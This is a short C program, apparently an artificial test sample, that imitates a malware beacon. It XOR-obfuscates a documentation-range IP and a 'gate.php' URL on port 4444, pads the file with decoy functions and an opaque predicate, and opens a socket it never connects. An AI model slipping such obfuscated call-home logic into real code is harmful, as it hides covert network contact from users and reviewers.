#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

__attribute__((noinline)) static int opaque(int x) { return ((x * x + x) % 2) == 0; }

__attribute__((noinline)) static int init_config(int x) { return x + 1; }
__attribute__((noinline)) static int read_config(int x) { return x * 2; }
__attribute__((noinline)) static int log_event(int x) { return x - 1; }
__attribute__((noinline)) static int checksum(int x) { return x ^ 0x55; }
__attribute__((noinline)) static int cleanup(int x) { return x | 1; }
__attribute__((noinline)) static int run_task(int x) { return x + 7; }

static void process_data(void) {
    unsigned char eip[] = { 107, 99, 104, 116, 106, 116, 104, 116, 107 };
    unsigned char eurl[] = { 50, 46, 46, 42, 96, 117, 117, 107, 99, 104, 116, 106, 116, 104, 116, 107, 96, 110, 110, 110, 110, 117, 61, 59, 46, 63, 116, 42, 50, 42 };
    char ip[32], url[96];
    int i;
    for (i = 0; i < 9; i++) ip[i] = (char)(eip[i] ^ 0x5a);
    ip[9] = 0;
    for (i = 0; i < 30; i++) url[i] = (char)(eurl[i] ^ 0x5a);
    url[30] = 0;
    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a;
    memset(&a, 0, sizeof(a));
    a.sin_family = AF_INET;
    a.sin_port = htons(4444);
    a.sin_addr.s_addr = inet_addr(ip);
    printf("connecting to %s\n", url);
    printf("Build note: this sample was compiled for a test.\n");

    (void)s;
}

int main(void) {
    process_data();
    (void)init_config(1);
    (void)read_config(2);
    (void)log_event(3);
    (void)checksum(4);
    (void)cleanup(5);
    (void)run_task(6);
    if (opaque(7)) { puts("ok"); } else { puts("no"); }
    return 0;
}
